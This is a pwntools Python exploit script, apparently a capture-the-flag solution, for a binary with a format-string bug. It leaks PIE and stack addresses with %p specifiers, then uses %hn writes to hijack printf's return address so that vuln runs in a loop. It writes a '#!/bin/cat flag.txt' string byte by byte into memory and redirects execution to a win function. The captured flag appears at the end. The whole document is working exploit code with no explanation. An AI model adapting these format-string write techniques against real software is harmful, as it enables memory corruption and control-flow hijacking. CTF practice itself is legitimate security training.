#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
brva 0x1455
continue
"""

exe = "./main"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

sla(b'first name:', b'%25$p%22$p')
recvunt(b'You entered ')
leaeked_pie = io.recv(14).decode()
leaked_stack = io.recv(14).decode()

elf.address = int(leaeked_pie,16) -0x147b

global printf_rip
printf_rip = int(leaked_stack,16) - 0xc8

log.info(leaked_stack)
# log.info(leaeked_pie)
log.info(hex(printf_rip))
# log.info(hex(elf.sym.vuln))

# Hook Loop printf
last_2_bytes = elf.sym.vuln & 0xffff  # Extract the last 2 bytes
log.info(hex(last_2_bytes))  

payload = f'%{last_2_bytes}x%14$hn'.encode()
# Pad the payload with zero bytes
payload = payload.ljust(16, b"A") + p64(printf_rip) 
sla(b'last name:', payload)

# Loop overwrite
def overwrite(addr, val):
    # test for offset
    # payload = b'%8$p%9$p%10$p'
    # payload = payload.ljust(16,b'B') + b"A" * 8

    # Writing Loop
    payload = f'%{val}x%10$hn'.encode()

    payload = payload.ljust(16, b"A") + p64(addr)
    sla(b'first name:', payload)

    # payload = b'%12$p%13$p%14$p'
    # payload = payload.ljust(16,b'B') + b"A" * 8

    global printf_rip
    printf_rip -= 0x68
    log.info(hex(printf_rip))
    payload = f'%{last_2_bytes}x%14$hn'.encode()
    # Pad the payload with zero bytes
    payload = payload.ljust(16, b"A") + p64(printf_rip)
    sla(b'last name:', payload)


buffer = elf.address + 0x4040
log.info("Buffer address: " + hex(buffer))

content = b"#!/bin/cat flag.txt"
hex_content = [
    0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63,
    0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e,
    0x74, 0x78, 0x74
]

# Loop writing content to buffer
for idx, val in enumerate(hex_content):
    overwrite(buffer + idx, val)

# Now ret2win
sla(b'first name:', b'bksecbksec') 
last_2_bytes = elf.sym.win & 0xffff  # Extract the last 2 bytes 
payload = f'%{last_2_bytes}x%14$hn'.encode()
payload = payload.ljust(16, b"A") + p64(printf_rip - 0x68) 
sla(b'last name:', payload)

io.interactive()

#Breach{5h0uldv3_l1573n3d_70_7h3_6cc_w4rn1n65}